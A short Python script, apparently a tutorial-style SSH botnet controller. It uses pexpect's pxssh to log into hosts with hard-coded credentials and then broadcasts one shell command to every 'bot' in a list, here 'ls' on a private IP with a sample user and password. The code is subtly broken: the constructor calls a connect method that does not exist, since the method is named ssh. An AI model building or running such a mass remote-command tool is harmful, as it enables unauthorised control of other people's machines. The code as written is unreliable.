from pexpect import pxssh

class Main:

    # initialize new client

    def __init__(self, host, user, passowrd):

        self.host = host
        self.user = user
        self.password = passowrd
        self.session = self.connect()

    # secure shell into client
    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot
        except Exception as e:
            print('Connection failure')
            print(e)

    # send command to client
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


# send a command to all bots in the botnet
def command_bots(command):
    for bot in botnet:
        attack = bot.send_command(command)
        print('Output from' + bot.host)
        print(attack)


# list of bot in botnet
botnet = []


# add a new bot to your botnet
def add_bot(host, user, password):
    new_bot = Main(host, user, password)
    botnet.append(new_bot)


add_bot('10.0.0.136', 'Alex Johnson', 'Jack2012')

# list user home directory
command_bots('ls')







